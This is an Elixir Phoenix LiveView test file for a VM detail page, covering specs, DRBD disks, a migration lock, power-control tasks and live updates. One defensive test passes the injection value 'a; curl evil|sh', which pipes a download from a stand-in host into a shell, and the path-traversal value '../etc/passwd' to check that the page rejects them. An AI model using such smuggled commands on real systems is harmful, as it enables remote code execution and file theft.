defmodule SpectrumPhxWeb.Vms.ShowLiveTest do
  # Not async: the VM source and the task submitter are configured through application
  # env, which is global.
  use SpectrumPhxWeb.ConnCase, async: false

  import Phoenix.LiveViewTest

  alias SpectrumPhx.Vms.Vm

  @running %Vm{
    name: "web-01",
    vcpu: 4,
    memory: 8192,
    state: "Running",
    host_ip: "10.10.0.11",
    firmware: "uefi",
    disks_list: "10G,500G:fast",
    disk_path: "/dev/drbd/by-res/web-01-disk0/0",
    iso: "debian-13.iso",
    boot_device: "hd",
    network_id: "net-42",
    cpu_model: "host-passthrough",
    audio_enabled: true
  }

  @stopped %Vm{
    name: "db.prod",
    vcpu: 2,
    memory: 2048,
    state: "Stopped",
    host_ip: "",
    disks_list: "NONE"
  }

  @migrating %Vm{
    name: "vm_1",
    vcpu: 1,
    memory: 1024,
    state: "Running",
    host_ip: "10.10.0.12",
    status: "migrating",
    disks_list: "20G"
  }

  setup do
    test_pid = self()

    Application.put_env(:spectrum_phx, :vms_source, {:static, [@running, @stopped, @migrating]})

    Application.put_env(:spectrum_phx, :vms_task_submitter, fn service, action, payload ->
      send(test_pid, {:task, service, action, payload})
      {:ok, %{"task_id" => "test-task", "status" => "pending"}}
    end)

    on_exit(fn ->
      Application.delete_env(:spectrum_phx, :vms_source)
      Application.delete_env(:spectrum_phx, :vms_task_submitter)
    end)

    :ok
  end

  describe "detail" do
    test "renders specs", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms/web-01")

      assert html =~ "web-01"
      assert html =~ "4"
      assert html =~ "8192 MiB"
      assert html =~ "uefi"
      assert html =~ "host-passthrough"
      assert html =~ "debian-13.iso"
      assert html =~ "net-42"
      assert html =~ "enabled"
    end

    test "renders placement and power state", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms/web-01")

      assert html =~ "10.10.0.11"
      assert html =~ "Running"
    end

    test "says so when a VM holds no placement", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms/db.prod")

      assert html =~ "Unassigned"
      assert html =~ "Stopped"
    end

    test "renders each disk with its DRBD resource and device path", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms/web-01")

      assert html =~ "web-01-disk0"
      assert html =~ "/dev/drbd/by-res/web-01-disk0/0"
      assert html =~ "web-01-disk1"
      assert html =~ "/dev/drbd/by-res/web-01-disk1/0"
      assert html =~ "fast"
    end

    test "treats the NONE sentinel as no disks", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms/db.prod")

      assert html =~ "no disks registered"
    end
  end

  describe "migration lock" do
    test "is shown, with its meaning, when held", %{conn: conn} do
      {:ok, view, html} = live(conn, ~p"/vms/vm_1")

      assert html =~ "Migration lock held"
      assert html =~ "migrating"
      assert view |> element("#migration-lock") |> has_element?()
    end

    test "is absent when the VM does not hold it", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/web-01")

      refute view |> element("#migration-lock") |> has_element?()
    end

    test "the lock does not hide the power state -- they are different columns", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms/vm_1")

      assert html =~ "Migration lock held"
      assert html =~ "Running"
    end

    test "lifecycle controls are refused while the lock is held", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/vm_1")

      assert view |> element("#stop[disabled]") |> has_element?()

      html = render_click(view, "power_off", %{})
      refute_received {:task, _, _, _}
      assert html =~ "locked until the migration settles"
    end
  end

  describe "power controls" do
    test "stop submits a stop task", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/web-01")

      html = view |> element("#stop") |> render_click()

      assert_received {:task, "vali", "stop", %{"vm_name" => "web-01"}}
      assert html =~ "Stop requested"
    end

    test "start submits a start task for a stopped VM", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/db.prod")

      html = view |> element("#start") |> render_click()

      assert_received {:task, "vali", "start", %{"vm_name" => "db.prod"}}
      assert html =~ "Start requested"
    end

    test "reboot submits a reboot task", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/web-01")

      view |> element("#reboot") |> render_click()

      assert_received {:task, "vali", "reboot", %{"vm_name" => "web-01"}}
    end
  end

  describe "unknown and invalid names" do
    test "redirects to the list for a VM that does not exist", %{conn: conn} do
      assert {:error, {:live_redirect, %{to: "/vms", flash: flash}}} =
               live(conn, ~p"/vms/no-such-vm")

      assert flash["error"] =~ "not in the cluster database"
    end

    test "an injection-shaped name in the URL never reaches the database", %{conn: conn} do
      assert {:error, {:live_redirect, %{to: "/vms", flash: flash}}} =
               live(conn, ~p"/vms/#{"a; curl evil|sh"}")

      assert flash["error"] =~ "Invalid VM name"
    end

    test "a path-traversal name in the URL is refused", %{conn: conn} do
      assert {:error, {:live_redirect, %{to: "/vms", flash: flash}}} =
               live(conn, ~p"/vms/#{"../etc/passwd"}")

      assert flash["error"] =~ "Invalid VM name"
    end
  end

  describe "live updates" do
    test "a state change is pushed without a page refresh", %{conn: conn} do
      {:ok, view, html} = live(conn, ~p"/vms/db.prod")
      assert html =~ "Stopped"

      updated = %Vm{@stopped | state: "Running", host_ip: "10.10.0.13"}
      Application.put_env(:spectrum_phx, :vms_source, {:static, [@running, updated, @migrating]})
      Phoenix.PubSub.broadcast(SpectrumPhx.PubSub, "vms", {:vm_updated, "db.prod"})

      html = render(view)
      assert html =~ "10.10.0.13"
      assert html =~ "Running"
    end

    test "a migration lock taken elsewhere appears without a refresh", %{conn: conn} do
      {:ok, view, html} = live(conn, ~p"/vms/web-01")
      refute html =~ "Migration lock held"

      locked = %Vm{@running | status: "migrating"}
      Application.put_env(:spectrum_phx, :vms_source, {:static, [locked, @stopped, @migrating]})

      send(view.pid, :poll)

      assert render(view) =~ "Migration lock held"
    end
  end
end
